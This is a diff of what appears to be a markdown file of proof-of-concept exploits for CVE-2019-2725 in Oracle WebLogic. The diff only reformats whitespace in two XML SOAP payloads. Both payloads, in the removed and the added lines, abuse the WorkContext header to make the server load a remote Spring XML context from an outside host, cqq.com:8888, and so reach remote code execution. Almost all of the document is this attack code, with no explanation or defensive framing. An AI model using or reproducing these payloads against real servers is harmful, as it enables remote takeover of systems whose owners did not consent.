@@ -12,10 +12,8 @@
 ### CVE-2019-2725_v10_v12
 poc:
 ```xml
-<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"> <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> 
-<java>
-<class><string>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</string>
-<void>
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> 
+<java><class><string>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</string><void>
 <string>
 http://cqq.com:8888/spel2.xml
 </string>
@@ -32,15 +30,10 @@ http://cqq.com:8888/spel2.xml
 
 poc:
 ```xml
-<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"> <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> 
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> 
 <java>
-<array method="forName">
-<string>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</string>
-<void>
-<string>
-http://cqq.com:8888/spel2.xml
-</string>
-</void>
+<array method="forName"><string>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</string>
+<void><string>http://cqq.com:8888/spel2.xml</string></void>
 </array>
 </java>
 </work:WorkContext>
